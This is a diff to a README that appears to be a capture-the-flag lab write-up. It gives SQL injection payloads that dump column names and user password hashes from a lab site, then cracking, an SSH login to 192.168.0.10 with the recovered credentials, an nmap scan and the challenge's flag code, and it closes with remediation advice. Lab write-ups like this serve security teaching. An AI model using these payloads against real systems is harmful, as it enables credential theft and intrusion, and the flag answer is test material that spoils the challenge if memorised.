@@ -78,3 +78,89 @@ a. **Open a web browser and navigate to the target website.**
   ![image (4)](https://github.com/user-attachments/assets/6152a3c0-cac0-42e7-ba55-e55f1d6bb69a)
 
   ![image (5)](https://github.com/user-attachments/assets/dc60cd01-1526-4c35-af72-5314708a4baf)
+
+
+### b. Locate a vulnerable input form that will allow you to inject SQL commands.
+
+**Retrieve column names from the 'users' table.**
+
+- Enter the payload: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'
+- Click "Submit."
+  
+  ![image (6)](https://github.com/user-attachments/assets/30497457-cb23-4b1a-81a1-048986b2870f)
+  ![image (7)](https://github.com/user-attachments/assets/eb83eb43-fe9f-41e5-9c56-4336626d0875)
+
+### c. Retrieve the username and the password hash for Bob Smith's account.
+
+**Retrieve the user credentials including Bob Smith.**
+
+- Enter the payload: 1' OR 1=1 UNION SELECT user, password FROM users #
+- Click "Submit."
+![image (8)](https://github.com/user-attachments/assets/b387f7df-45d3-4e35-bbe9-264dc823ee3a)
+![image (9)](https://github.com/user-attachments/assets/31bb98ee-af42-4985-a6af-e802a5098e2f)
+
+
+  ### Step 3: Crack Bob Smith’s account password.
+
+Use any password hash cracking tool desired to crack Bob Smith’s password.
+Question
+
+### What is the password of Bob Smith’s account?
+
+<img width="960" height="504" alt="Screenshot 2026-01-11 160714" src="https://github.com/user-attachments/assets/5708cb56-f3fd-4165-95b1-216c89bd122b" />
+
+<img width="960" height="504" alt="Screenshot 2026-01-11 160930" src="https://github.com/user-attachments/assets/714f8606-1161-4717-b5c3-35a7e1f065da" />
+
+![image (10)](https://github.com/user-attachments/assets/ad4f992e-004c-48b8-aa55-6d3a98f82cb5)
+
+## Step 4: Locate and open the file with Challenge 1 code.
+
+### a. Log into 192.168.0.10 as Bob Smith.
+
+**Log into the target server.**
+
+- Use SSH or a terminal to connect to 192.168.0.10.
+- Username: smithy (Bob Smith's username from the dump).
+- Password: password (cracked value).
+
+  **ssh smithy@192.168.0.10**
+
+**Scan for open ports if needed.**
+
+- Use nmap: nmap 192.168.0.10
+- Shows open ports like 22 (SSH)
+![image (11)](https://github.com/user-attachments/assets/0d6f5752-b86d-421c-881c-314c4b0ce82d)
+ ![image (12)](https://github.com/user-attachments/assets/17ca54b6-0def-44ad-bf07-149d0ad81eb3)
+
+ ![image (13)](https://github.com/user-attachments/assets/3d96f4e9-d844-413a-aaf6-7d34436c97b2)
+
+ ![image (14)](https://github.com/user-attachments/assets/b544f99f-c30a-4ba5-9680-c404de65e7b7)
+
+### What is the name of the file with the code?
+
+**Navigate and open the challenge file.**
+
+- Once logged in, list files: ls
+- Locate 'my_passwords.txt' or similar.
+- View contents: cat my_passwords.txt
+- Expected output: "Congratulations! You found the flag for Challenge 1! The code for this challenge is 874wfb2."
+
+![image (15)](https://github.com/user-attachments/assets/22482e97-2147-4104-b837-7c1ec442e7cf)
+
+![image (16)](https://github.com/user-attachments/assets/4da80c76-e870-4371-901f-764860bfabda)
+
+
+## Step 5: Research and propose SQL attack remediation
+
+What are five remediation methods for preventing SQL injection exploits
+
+Here are five key remediation methods for preventing SQL injection exploits:
+prepared statements
+
+implementing the principle of least privilege
+
+employing input validation
+
+utilizing stored procedures
+
+managing error messages securely
